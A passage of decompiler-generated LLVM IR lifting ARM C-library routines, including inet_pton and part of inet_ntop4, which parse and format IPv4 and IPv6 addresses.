  %v2_18d5c = icmp eq i8 %v2_18d58, 0
  store i1 %v2_18d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d5c, label %dec_label_pc_18d58.dec_label_pc_18d68_crit_edge, label %dec_label_pc_18cf0

dec_label_pc_18d58.dec_label_pc_18d68_crit_edge:  ; preds = %dec_label_pc_18d58.backedge
  %v0_18d68.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18d68

dec_label_pc_18d68:                               ; preds = %dec_label_pc_18d58.dec_label_pc_18d68_crit_edge, %entry
  %v0_18d68 = phi i32 [ %v0_18d68.pre, %dec_label_pc_18d58.dec_label_pc_18d68_crit_edge ], [ 0, %entry ]
  %v7_18d68 = icmp eq i32 %v0_18d68, 3
  store i1 %v7_18d68, i1* %cpsr_z.global-to-local, align 1
  %v7_18d6c = icmp slt i32 %v0_18d68, 4
  br i1 %v7_18d6c, label %dec_label_pc_18d8c, label %dec_label_pc_18d70

dec_label_pc_18d70:                               ; preds = %dec_label_pc_18d68
  %v0_18d70 = load i32, i32* @r5, align 4
  store i32 %v0_18d70, i32* @r0, align 4
  store i32 %v2_18cd0, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_18d7c = call i32 @memcpy()
  br label %dec_label_pc_18d8c

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18cfc, %dec_label_pc_18d20, %bb, %dec_label_pc_18d4c, %.thread12, %dec_label_pc_18d68, %dec_label_pc_18d70
  %storemerge = phi i32 [ 1, %dec_label_pc_18d70 ], [ 0, %dec_label_pc_18d68 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_18d4c ], [ 0, %bb ], [ 0, %dec_label_pc_18d20 ], [ 0, %dec_label_pc_18cfc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_18cc8, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_18d68, { 1, 0 }
  uselistorder i32 %v3_18d58, { 1, 0 }
  uselistorder i32 %v0_18d34, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_18d8c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_18d58.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18cf0, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_18d94 = load i32, i32* @r4, align 4
  %v6_18d94 = load i32, i32* @r5, align 4
  %v9_18d94 = load i32, i32* @r6, align 4
  %v7_18d98 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_18d98, label %dec_label_pc_18db8, label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %entry
  %v7_18dac = icmp eq i32 %arg1, 10
  br i1 %v7_18dac, label %dec_label_pc_18dcc, label %dec_label_pc_18f7c

dec_label_pc_18db8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_18dc0 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_18dc0, i32* %r0.global-to-local, align 4
  store i32 %v4_18dc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18dac
  %v2_18dcc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_18dcc, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_18dd8 = bitcast i32* %stack_var_-52 to i8*
  %v3_18dd8 = call i32 @__GI_memset(i8* %v2_18dd8, i32 0)
  store i32 %v3_18dd8, i32* %r0.global-to-local, align 4
  %v0_18ddc = load i32, i32* @r6, align 4
  %v1_18ddc = inttoptr i32 %v0_18ddc to i8*
  %v2_18ddc = load i8, i8* %v1_18ddc, align 1
  %v3_18ddc = zext i8 %v2_18ddc to i32
  store i32 %v3_18ddc, i32* %r3.global-to-local, align 4
  %v7_18de0 = icmp eq i8 %v2_18ddc, 58
  store i32 %v3_18dd8, i32* @r4, align 4
  %v2_18de8 = add i32 %v3_18dd8, 16
  store i32 %v2_18de8, i32* %r8.global-to-local, align 4
  br i1 %v7_18de0, label %dec_label_pc_18df0, label %dec_label_pc_18dfc

dec_label_pc_18df0:                               ; preds = %dec_label_pc_18dcc
  %v1_18df0 = add i32 %v0_18ddc, 1
  %v2_18df0 = inttoptr i32 %v1_18df0 to i8*
  %v3_18df0 = load i8, i8* %v2_18df0, align 1
  %v4_18df0 = zext i8 %v3_18df0 to i32
  store i32 %v4_18df0, i32* %r3.global-to-local, align 4
  store i32 %v1_18df0, i32* @r6, align 4
  %v7_18df4 = icmp eq i8 %v3_18df0, 58
  br i1 %v7_18df4, label %dec_label_pc_18dfc, label %dec_label_pc_18f90

dec_label_pc_18dfc:                               ; preds = %dec_label_pc_18df0, %dec_label_pc_18dcc
  %v0_18e00 = phi i32 [ %v1_18df0, %dec_label_pc_18df0 ], [ %v0_18ddc, %dec_label_pc_18dcc ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_18e00, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_18edc7 = inttoptr i32 %v0_18e00 to i8*
  %v2_18edc8 = load i8, i8* %v1_18edc7, align 1
  %v3_18edc9 = zext i8 %v2_18edc8 to i32
  store i32 %v3_18edc9, i32* %r0.global-to-local, align 4
  %v1_18ee010 = call i32 @__GI_tolower(i32 %v3_18edc9)
  store i32 %v1_18ee010, i32* %r0.global-to-local, align 4
  store i32 %v1_18ee010, i32* @r5, align 4
  %v2_18ee412 = icmp eq i32 %v1_18ee010, 0
  br i1 %v2_18ee412, label %dec_label_pc_18eec, label %dec_label_pc_18e10

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18dfc, %dec_label_pc_18edc.backedge
  %v0_18e14 = phi i32 [ %v1_18ee0, %dec_label_pc_18edc.backedge ], [ %v1_18ee010, %dec_label_pc_18dfc ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_18edc.backedge ], [ 0, %dec_label_pc_18dfc ]
  store i32 ptrtoint ([17 x i8]* @global_var_242c8.1339 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_242c8.1339 to i32), i32* %r0.global-to-local, align 4
  %v3_18e1c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_242c8.1339 to i32), i32 %v0_18e14)
  %v4_18e1c = trunc i32 %v3_18e1c to i8
  store i32 %v3_18e1c, i32* %r0.global-to-local, align 4
  %v3_18e20 = icmp eq i8 %v4_18e1c, 0
  %v0_18e24 = load i32, i32* @r6, align 4
  %v1_18e24 = add i32 %v0_18e24, 1
  store i32 %v1_18e24, i32* @r6, align 4
  br i1 %v3_18e20, label %dec_label_pc_18e40, label %dec_label_pc_18e2c

dec_label_pc_18e2c:                               ; preds = %dec_label_pc_18e10
  %v0_18e2c = load i32, i32* %sb.global-to-local, align 4
  %v2_18e2c = sext i8 %v4_18e1c to i32
  %v3_18e2c = sub i32 %v2_18e2c, %v0_18e2c
  store i32 %v3_18e2c, i32* %r3.global-to-local, align 4
  %v1_18e30 = load i32, i32* %r7.global-to-local, align 4
  %v4_18e30 = mul i32 %v1_18e30, 16
  %v5_18e30 = or i32 %v4_18e30, %v3_18e2c
  store i32 %v5_18e30, i32* %r7.global-to-local, align 4
  %v3_18e38 = icmp ult i32 %v5_18e30, 65534
  br i1 %v3_18e38, label %dec_label_pc_18ed4, label %dec_label_pc_18f90

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18e10
  %v0_18e40 = load i32, i32* @r5, align 4
  %v7_18e40 = icmp eq i32 %v0_18e40, 58
  br i1 %v7_18e40, label %dec_label_pc_18e48, label %dec_label_pc_18ea4

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e40
  %v4_18e482 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_18e482, i32* %r3.global-to-local, align 4
  %v2_18e4c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_18e4c, label %dec_label_pc_18e54, label %dec_label_pc_18e68

dec_label_pc_18e54:                               ; preds = %dec_label_pc_18e48
  %v0_18e54 = load i32, i32* %fp.global-to-local, align 4
  %v2_18e54 = icmp eq i32 %v0_18e54, 0
  br i1 %v2_18e54, label %dec_label_pc_18e5c, label %dec_label_pc_18f90

dec_label_pc_18e5c:                               ; preds = %dec_label_pc_18e54
  %v0_18e5c = load i32, i32* @r4, align 4
  store i32 %v0_18e5c, i32* %fp.global-to-local, align 4
  store i32 %v1_18e24, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18edc.backedge

dec_label_pc_18e68:                               ; preds = %dec_label_pc_18e48
  %v1_18e68 = inttoptr i32 %v1_18e24 to i8*
  %v2_18e68 = load i8, i8* %v1_18e68, align 1
  %v3_18e68 = zext i8 %v2_18e68 to i32
  store i32 %v3_18e68, i32* %r3.global-to-local, align 4
  %v2_18e6c = icmp eq i8 %v2_18e68, 0
  br i1 %v2_18e6c, label %dec_label_pc_18f90, label %dec_label_pc_18e74

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e68
  %v0_18e74 = load i32, i32* @r4, align 4
  %v1_18e74 = add i32 %v0_18e74, 2
  store i32 %v1_18e74, i32* %r3.global-to-local, align 4
  %v1_18e78 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_18e74, %v1_18e78
  br i1 %tmp38, label %dec_label_pc_18f90, label %dec_label_pc_18e80

dec_label_pc_18e80:                               ; preds = %dec_label_pc_18e74
  %v0_18e80 = load i32, i32* %r7.global-to-local, align 4
  %v3_18e80 = udiv i32 %v0_18e80, 256
  store i32 %v3_18e80, i32* %r2.global-to-local, align 4
  store i32 %v0_18e74, i32* %r3.global-to-local, align 4
  %v1_18e88 = trunc i32 %v3_18e80 to i8
  %v3_18e88 = inttoptr i32 %v0_18e74 to i8*
  store i8 %v1_18e88, i8* %v3_18e88, align 1
  %v4_18e88 = load i32, i32* %r3.global-to-local, align 4
  %v5_18e88 = add i32 %v4_18e88, 1
  store i32 %v5_18e88, i32* %r3.global-to-local, align 4
  %v0_18e8c = load i32, i32* @r6, align 4
  store i32 %v0_18e8c, i32* %sl.global-to-local, align 4
  %v0_18e90 = load i32, i32* %r7.global-to-local, align 4
  %v1_18e90 = trunc i32 %v0_18e90 to i8
  %v2_18e90 = load i32, i32* @r4, align 4
  %v3_18e90 = add i32 %v2_18e90, 1
  %v4_18e90 = inttoptr i32 %v3_18e90 to i8*
  store i8 %v1_18e90, i8* %v4_18e90, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_18e98 = load i32, i32* %r3.global-to-local, align 4
  %v1_18e98 = add i32 %v0_18e98, 1
  store i32 %v1_18e98, i32* @r4, align 4
  %v0_18edc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18edc.backedge

dec_label_pc_18ea4:                               ; preds = %dec_label_pc_18e40
  %v7_18ea4 = icmp eq i32 %v0_18e40, 46
  br i1 %v7_18ea4, label %dec_label_pc_18eac, label %dec_label_pc_18f90

dec_label_pc_18eac:                               ; preds = %dec_label_pc_18ea4
  %v0_18eac = load i32, i32* @r4, align 4
  %v1_18eac = add i32 %v0_18eac, 4
  store i32 %v1_18eac, i32* @r5, align 4
  %v1_18eb0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_18eac, %v1_18eb0
  br i1 %tmp39, label %dec_label_pc_18f90, label %dec_label_pc_18eb8

dec_label_pc_18eb8:                               ; preds = %dec_label_pc_18eac
  %v0_18ebc = load i32, i32* %sl.global-to-local, align 4
  %v1_18ebc = inttoptr i32 %v0_18ebc to i8*
  store i32 %v0_18ebc, i32* %r0.global-to-local, align 4
  %v4_18ec0 = call i32 @inet_pton4(i8* %v1_18ebc, i32 %v0_18eac)
  store i32 %v4_18ec0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_18ec0, 1
  br i1 %tmp36, label %dec_label_pc_18f90, label %bb

bb:                                               ; preds = %dec_label_pc_18eb8
  %v5_18ec8 = load i32, i32* @r5, align 4
  store i32 %v5_18ec8, i32* @r4, align 4
  br label %dec_label_pc_18f18

dec_label_pc_18ed4:                               ; preds = %dec_label_pc_18e2c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18edc.backedge

dec_label_pc_18edc.backedge:                      ; preds = %dec_label_pc_18ed4, %dec_label_pc_18e5c, %dec_label_pc_18e80
  %v0_18edc = phi i32 [ %v1_18e24, %dec_label_pc_18e5c ], [ %v0_18edc.pre, %dec_label_pc_18e80 ], [ %v1_18e24, %dec_label_pc_18ed4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_18e5c ], [ 0, %dec_label_pc_18e80 ], [ 1, %dec_label_pc_18ed4 ]
  %v1_18edc = inttoptr i32 %v0_18edc to i8*
  %v2_18edc = load i8, i8* %v1_18edc, align 1
  %v3_18edc = zext i8 %v2_18edc to i32
  store i32 %v3_18edc, i32* %r0.global-to-local, align 4
  %v1_18ee0 = call i32 @__GI_tolower(i32 %v3_18edc)
  store i32 %v1_18ee0, i32* %r0.global-to-local, align 4
  store i32 %v1_18ee0, i32* @r5, align 4
  %v2_18ee4 = icmp eq i32 %v1_18ee0, 0
  br i1 %v2_18ee4, label %dec_label_pc_18eec, label %dec_label_pc_18e10

dec_label_pc_18eec:                               ; preds = %dec_label_pc_18edc.backedge, %dec_label_pc_18dfc
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_18dfc ], [ %stack_var_-56.0.be, %dec_label_pc_18edc.backedge ]
  %v4_18eec3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_18eec3, i32* %r3.global-to-local, align 4
  %v2_18ef0 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_18f5c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_18ef0, label %dec_label_pc_18f18, label %dec_label_pc_18ef8

dec_label_pc_18ef8:                               ; preds = %dec_label_pc_18eec
  %v1_18ef8 = add i32 %v0_18f5c.pre.pre, 2
  store i32 %v1_18ef8, i32* %r3.global-to-local, align 4
  %v1_18efc = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_18ef8, %v1_18efc
  br i1 %tmp40, label %dec_label_pc_18f90, label %dec_label_pc_18f04

dec_label_pc_18f04:                               ; preds = %dec_label_pc_18ef8
  store i32 %v0_18f5c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_18f08 = load i32, i32* %r7.global-to-local, align 4
  %v3_18f08 = udiv i32 %v0_18f08, 256
  store i32 %v3_18f08, i32* %r2.global-to-local, align 4
  %v1_18f0c = trunc i32 %v3_18f08 to i8
  %v3_18f0c = inttoptr i32 %v0_18f5c.pre.pre to i8*
  store i8 %v1_18f0c, i8* %v3_18f0c, align 1
  %v4_18f0c = load i32, i32* %r3.global-to-local, align 4
  %v5_18f0c = add i32 %v4_18f0c, 1
  store i32 %v5_18f0c, i32* %r3.global-to-local, align 4
  %v0_18f10 = load i32, i32* %r7.global-to-local, align 4
  %v1_18f10 = trunc i32 %v0_18f10 to i8
  %v2_18f10 = load i32, i32* @r4, align 4
  %v3_18f10 = add i32 %v2_18f10, 1
  %v4_18f10 = inttoptr i32 %v3_18f10 to i8*
  store i8 %v1_18f10, i8* %v4_18f10, align 1
  %v0_18f14 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f14 = add i32 %v0_18f14, 1
  store i32 %v1_18f14, i32* @r4, align 4
  br label %dec_label_pc_18f18

dec_label_pc_18f18:                               ; preds = %dec_label_pc_18eec, %bb, %dec_label_pc_18f04
  %v0_18f5c.pre = phi i32 [ %v5_18ec8, %bb ], [ %v1_18f14, %dec_label_pc_18f04 ], [ %v0_18f5c.pre.pre, %dec_label_pc_18eec ]
  %v0_18f18 = load i32, i32* %fp.global-to-local, align 4
  %v2_18f18 = icmp eq i32 %v0_18f18, 0
  %v1_18f5c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_18f18, label %dec_label_pc_18f5c, label %dec_label_pc_18f20

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18f18
  %v9_18f20 = icmp eq i32 %v0_18f5c.pre, %v1_18f5c.pre
  %v2_18f24 = sub i32 %v0_18f5c.pre, %v0_18f18
  store i32 %v2_18f24, i32* %r0.global-to-local, align 4
  br i1 %v9_18f20, label %dec_label_pc_18f90, label %dec_label_pc_18f44.preheader

dec_label_pc_18f44.preheader:                     ; preds = %dec_label_pc_18f20
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f44

dec_label_pc_18f34:                               ; preds = %dec_label_pc_18f44
  %v0_18f34 = load i32, i32* %fp.global-to-local, align 4
  %v2_18f34 = add i32 %v0_18f34, %v2_18f48
  %v3_18f34 = inttoptr i32 %v2_18f34 to i8*
  %v4_18f34 = load i8, i8* %v3_18f34, align 1
  %v3_18f38 = inttoptr i32 %v2_18f4c to i8*
  store i8 %v4_18f34, i8* %v3_18f38, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_18f40 = load i32, i32* %fp.global-to-local, align 4
  %v3_18f40 = load i32, i32* %ip.global-to-local, align 4
  %v4_18f40 = add i32 %v3_18f40, %v2_18f40
  %v5_18f40 = inttoptr i32 %v4_18f40 to i8*
  store i8 0, i8* %v5_18f40, align 1
  %v0_18f44.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18f44.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_18f4c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18f44

dec_label_pc_18f44:                               ; preds = %dec_label_pc_18f44.preheader, %dec_label_pc_18f34
  %v0_18f58 = phi i32 [ %v1_18f5c.pre, %dec_label_pc_18f44.preheader ], [ %v1_18f4c.pre, %dec_label_pc_18f34 ]
  %v1_18f48 = phi i32 [ %v2_18f24, %dec_label_pc_18f44.preheader ], [ %v1_18f44.pre, %dec_label_pc_18f34 ]
  %v0_18f50 = phi i32 [ 1, %dec_label_pc_18f44.preheader ], [ %v0_18f44.pre, %dec_label_pc_18f34 ]
  %v2_18f48 = sub i32 %v1_18f48, %v0_18f50
  store i32 %v2_18f48, i32* %ip.global-to-local, align 4
  %v2_18f4c = sub i32 %v0_18f58, %v0_18f50
  store i32 %v2_18f4c, i32* @lr, align 4
  %v1_18f50 = add i32 %v0_18f50, 1
  store i32 %v1_18f50, i32* %r2.global-to-local, align 4
  %v7_18f54 = icmp slt i32 %v1_18f48, %v0_18f50
  br i1 %v7_18f54, label %dec_label_pc_18f58, label %dec_label_pc_18f34

dec_label_pc_18f58:                               ; preds = %dec_label_pc_18f44
  store i32 %v0_18f58, i32* @r4, align 4
  br label %dec_label_pc_18f5c

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f18, %dec_label_pc_18f58
  %v0_18f5c = phi i32 [ %v0_18f58, %dec_label_pc_18f58 ], [ %v0_18f5c.pre, %dec_label_pc_18f18 ]
  %v1_18f5c = phi i32 [ %v0_18f58, %dec_label_pc_18f58 ], [ %v1_18f5c.pre, %dec_label_pc_18f18 ]
  %v9_18f5c = icmp eq i32 %v0_18f5c, %v1_18f5c
  br i1 %v9_18f5c, label %dec_label_pc_18f64, label %dec_label_pc_18f90

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18f5c
  store i32 16, i32* @r2, align 4
  %v2_18f68 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_18f68, i32* @r0, align 4
  store i32 %v2_18dcc, i32* @r1, align 4
  %v0_18f70 = call i32 @memcpy()
  store i32 %v0_18f70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_18dac
  %v0_18f7c = call i32 @__errno_location()
  store i32 %v0_18f7c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_18f88 = inttoptr i32 %v0_18f7c to i32*
  store i32 97, i32* %v2_18f88, align 4
  %v0_18f94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f90:                               ; preds = %dec_label_pc_18e2c, %dec_label_pc_18e54, %dec_label_pc_18e74, %dec_label_pc_18e68, %dec_label_pc_18eb8, %dec_label_pc_18f20, %dec_label_pc_18ea4, %dec_label_pc_18f5c, %dec_label_pc_18df0, %dec_label_pc_18ef8, %dec_label_pc_18eac
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f94:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18f64, %dec_label_pc_18db8, %dec_label_pc_18f90
  %v0_18f94 = phi i32 [ %v0_18f94.pre, %dec_label_pc_18f7c ], [ 1, %dec_label_pc_18f64 ], [ %v4_18dc0, %dec_label_pc_18db8 ], [ 0, %dec_label_pc_18f90 ]
  store i32 %v0_18f94, i32* %r0.global-to-local, align 4
  store i32 %v3_18d94, i32* @r4, align 4
  store i32 %v6_18d94, i32* @r5, align 4
  store i32 %v9_18d94, i32* @r6, align 4
  ret i32 %v0_18f94

; uselistorder directives
  uselistorder i32 %v0_18f94, { 1, 0 }
  uselistorder i32 %v2_18f4c, { 1, 0 }
  uselistorder i32 %v2_18f48, { 1, 0 }
  uselistorder i32 %v0_18f50, { 0, 1, 3, 2 }
  uselistorder i32 %v0_18f58, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18f5c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_18f5c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_18f08, { 1, 0 }
  uselistorder i32 %v0_18f5c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_18ee0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_18ebc, { 1, 0 }
  uselistorder i32 %v3_18e80, { 1, 0 }
  uselistorder i32 %v0_18e74, { 1, 0, 2 }
  uselistorder i32 %v1_18e24, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_18e1c, { 1, 0 }
  uselistorder i32 %v0_18e00, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 4, 0, 3, 6, 7, 1, 2, 8, 5, 9, 10, 11, 12 }
  uselistorder i32 58, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f94, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_18f90, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_18f5c, { 1, 0 }
  uselistorder label %dec_label_pc_18f44, { 1, 0 }
  uselistorder label %dec_label_pc_18f18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18edc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18e10, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18fa4 = load i32, i32* @r4, align 4
  store i32 %v3_18fa4, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_242b4.1341 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_18fc0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_18fc0, i32* @r0, align 4
  %v0_18fc4 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_18fd4 = bitcast i32* %stack_var_-51 to i8*
  %v3_18fd4 = call i32 @__GI_memset(i8* %v2_18fd4, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1909c = ptrtoint i32* %stack_var_-36 to i32
  %v2_19078 = add i32 %v2_1909c, -17
  br label %dec_label_pc_1909c

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_1909c
  %v0_18fe4 = load i32, i32* %fp.global-to-local, align 4
  %v2_18fe4 = add i32 %v0_18fe4, %v1_18fe4
  %v3_18fe4 = inttoptr i32 %v2_18fe4 to i8*
  %v4_18fe4 = load i8, i8* %v3_18fe4, align 1
  %v6_18fe4 = zext i8 %v4_18fe4 to i32
  store i32 %v6_18fe4, i32* %r4.global-to-local, align 4
  %v1_18fe8 = add i32 %v0_18fe8, 1
  store i32 %v1_18fe8, i32* %r7.global-to-local, align 4
  store i32 %v2_1909c, i32* %r2.global-to-local, align 4
  %v2_18ff4 = add i32 %v1_18fe8, %v2_1909c
  store i32 %v2_18ff4, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_18fe4, 100
  %v1_18ffc = or i8 %div, 48
  %v3_19000 = add i32 %v2_190ac, -17
  %v4_19000 = inttoptr i32 %v3_19000 to i8*
  store i8 %v1_18ffc, i8* %v4_19000, align 1
  %v0_19004 = load i32, i32* %r5.global-to-local, align 4
  %v1_19004 = add i32 %v0_19004, -17
  %v2_19004 = inttoptr i32 %v1_19004 to i8*
  %v3_19004 = load i8, i8* %v2_19004, align 1
  %v7_19008 = icmp eq i8 %v3_19004, 48
  %v0_1900c = load i32, i32* %fp.global-to-local, align 4
  %v1_1900c = load i32, i32* %r8.global-to-local, align 4
  %v2_1900c = add i32 %v1_1900c, %v0_1900c
  store i32 %v2_1900c, i32* %sb.global-to-local, align 4
  %v0_19014 = load i32, i32* %r4.global-to-local, align 4
  %v2_1901c = udiv i32 %v0_19014, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19024 = urem i32 %v2_1901c, 256
  %v2_19028 = urem i32 %v1_19024, 10
  %v1_1902c = or i32 %v2_19028, 48
  %v1_19030 = trunc i32 %v1_1902c to i8
  br i1 %v7_19008, label %dec_label_pc_1901c, label %dec_label_pc_19044

dec_label_pc_1901c:                               ; preds = %dec_label_pc_18fe4
  store i8 %v1_19030, i8* %v2_19004, align 1
  %v0_19034 = load i32, i32* %r5.global-to-local, align 4
  %v1_19034 = add i32 %v0_19034, -17
  %v2_19034 = inttoptr i32 %v1_19034 to i8*
  %v3_19034 = load i8, i8* %v2_19034, align 1
  %v7_19038 = icmp eq i8 %v3_19034, 48
  br i1 %v7_19038, label %dec_label_pc_1901c.dec_label_pc_19068_crit_edge, label %bb

dec_label_pc_1901c.dec_label_pc_19068_crit_edge:  ; preds = %dec_label_pc_1901c
  %v1_19078.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19068

bb:                                               ; preds = %dec_label_pc_1901c
  %v1_1903c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1903c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19068

dec_label_pc_19044:                               ; preds = %dec_label_pc_18fe4
  %v2_19060 = load i32, i32* %sl.global-to-local, align 4
  %v3_19060 = add i32 %v2_19060, -17
  %v4_19060 = inttoptr i32 %v3_19060 to i8*
  store i8 %v1_19030, i8* %v4_19060, align 1
  %v0_19064 = load i32, i32* %r7.global-to-local, align 4
  %v1_19064 = add i32 %v0_19064, 1
  store i32 %v1_19064, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_19068

